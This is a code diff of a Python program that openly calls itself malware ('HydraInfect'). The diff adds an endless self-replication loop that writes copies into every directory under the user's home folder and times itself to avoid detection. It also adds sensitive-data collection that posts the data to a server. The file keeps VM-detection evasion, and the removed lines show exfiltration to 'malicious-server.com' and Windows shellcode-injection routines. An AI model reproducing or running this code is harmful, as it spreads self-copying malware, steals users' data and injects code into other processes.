@@ -4,8 +4,8 @@ import ctypes
 # import psutil
 import shutil
 import random
-# import requests
-# Mutation 89647
+import requests
+import time
 # import winreg
 
 
@@ -31,12 +31,6 @@ shellcode = (
 )
 
 # 1. Environment Detection (Basic Evasion)
-# def is_virtual_environment():
-#     if os.path.exists('/proc/scsi/scsi'):
-#         with open('/proc/scsi/scsi') as f:
-#             if 'VMware' in f.read() or 'VirtualBox' in f.read():
-#                 return True
-#     return False
 
 def is_virtual_environment():
     if platform.system() == "Linux":
@@ -44,8 +38,7 @@ def is_virtual_environment():
         if os.path.exists('/proc/scsi/scsi'):
             with open('/proc/scsi/scsi') as f:
                 if 'VMware' in f.read() or 'VirtualBox' in f.read() or 'QEMU' in f.read():
-                    return True
-        
+                    return True        
         # Check for DMI entries (BIOS/Hardware info)
         if os.path.exists('/sys/class/dmi/id/product_name'):
             with open('/sys/class/dmi/id/product_name') as f:
@@ -141,18 +134,6 @@ def display_message():
         print("You've been infected by HydraInfect!")  # Fallback for other OSes
 
 # 3. Virus-like Behavior (Self-Replication)
-# def replicate():
-#     current_file = __file__
-#     target_locations = []
-
-#     if platform.system() == "Windows":
-#         target_locations.append(os.path.join(os.environ["HOMEPATH"], "malware_copy.exe"))
-#     elif platform.system() == "Linux" or platform.system() == "Darwin":
-#         target_locations.append(os.path.expanduser("~/malware_copy"))
-
-#     for target in target_locations:
-#         shutil.copyfile(current_file, target)
-
 
 def replicate():
     current_file = __file__
@@ -173,6 +154,27 @@ def replicate():
         print(f"Copying to: {target}")
         shutil.copyfile(current_file, target)
 
+def infinite_replicate():
+    current_file = __file__
+    target_dir = os.path.expanduser("~")  # Start in the user's home directory
+
+    while True:
+        for i in range(10):  # Limit the number of copies per loop to prevent rapid system overload
+            target_location = os.path.join(target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
+            shutil.copyfile(current_file, target_location)
+            print(f"Copied to {target_location}")
+
+        # Recursively replicate to other directories
+        for root, dirs, files in os.walk(target_dir):
+            for name in dirs:
+                new_target_dir = os.path.join(root, name)
+                target_location = os.path.join(new_target_dir, f"malware_copy_{random.randint(1000, 9999)}.py")
+                shutil.copyfile(current_file, target_location)
+                print(f"Copied to {target_location}")
+
+        # Wait a bit before replicating again to avoid immediate detection
+        time.sleep(5)
+
 
 # 4. Mutation
 def mutate():
@@ -186,15 +188,6 @@ def mutate():
         f.writelines(lines)
 
 # 5. Data Exfiltration
-# def exfiltrate():
-#     sensitive_data = "example_data_to_exfiltrate"
-#     target_url = "http://malicious-server.com/exfiltrate"
-
-#     try:
-#         response = requests.post(target_url, data={'data': sensitive_data})
-#         print("Data exfiltrated")
-#     except Exception as e:
-#         print(f"Failed to exfiltrate data: {e}")
 
 def collect_sensitive_data():
     # Path to files where sensitive data might be stored
@@ -212,50 +205,15 @@ def collect_sensitive_data():
     return sensitive_data
 
 
-# def exfiltrate(data, target_url):
-#     try:
-#         response = requests.post(target_url, data={'data': data})
-#         if response.status_code == 200:
-#             print("Data exfiltrated successfully")
-#         else:
-#             print(f"Failed to exfiltrate data, status code: {response.status_code}")
-#     except Exception as e:
-#         print(f"Failed to exfiltrate data: {e}")
-
-
-# # Code Injection
-# def find_process_by_name(process_name):
-#     for proc in psutil.process_iter(['pid', 'name']):
-#         if proc.info['name'] == process_name:
-#             return proc.info['pid']
-#     return None
-
-# def allocate_memory_in_target(pid, shellcode):
-#     kernel32 = ctypes.windll.kernel32
-#     process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
-#     memory_allocation = kernel32.VirtualAllocEx(process_handle, 0, len(shellcode), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
-#     return process_handle, memory_allocation
-
-# def write_shellcode_to_memory(process_handle, memory_allocation, shellcode):
-#     kernel32 = ctypes.windll.kernel32
-#     kernel32.WriteProcessMemory(process_handle, memory_allocation, shellcode, len(shellcode), 0)
-
-# def execute_shellcode(process_handle, memory_allocation):
-#     kernel32 = ctypes.windll.kernel32
-#     thread_id = ctypes.c_ulong(0)
-#     kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation, None, 0, ctypes.byref(thread_id))
-#     kernel32.CloseHandle(process_handle)
-
-# def inject_code_into_process(process_name, shellcode):
-#     pid = find_process_by_name(process_name)
-#     if pid is None:
-#         print(f"Process {process_name} not found.")
-#         return
-
-#     process_handle, memory_allocation = allocate_memory_in_target(pid, shellcode)
-#     write_shellcode_to_memory(process_handle, memory_allocation, shellcode)
-#     execute_shellcode(process_handle, memory_allocation)
-#     print(f"Injected shellcode into process {process_name} (PID: {pid})")
+def exfiltrate(data, target_url):
+    try:
+        response = requests.post(target_url, data={'data': data})
+        if response.status_code == 200:
+            print("Data exfiltrated successfully")
+        else:
+            print(f"Failed to exfiltrate data, status code: {response.status_code}")
+    except Exception as e:
+        print(f"Failed to exfiltrate data: {e}")
 
 # Main function to run the malware
 def main():
@@ -265,16 +223,14 @@ def main():
     else:
         print("not VM")
 
-    sensitive_data = collect_sensitive_data()
-    # print(sensitive_data)
     replicate()
+    infinite_replicate()
     mutate()
-    # exfiltrate()
+    sensitive_data = collect_sensitive_data()
+    target_url = "http://localhost:8000"  # Use a local server URL for testing
+    exfiltrate(sensitive_data, target_url)
     display_message()
 
-    # # Inject into notepad.exe (Windows only, make sure notepad is running)
-    # if platform.system() == "Windows":
-    #     inject_code_into_process("notepad.exe", shellcode)
 
 if __name__ == "__main__":
     main()
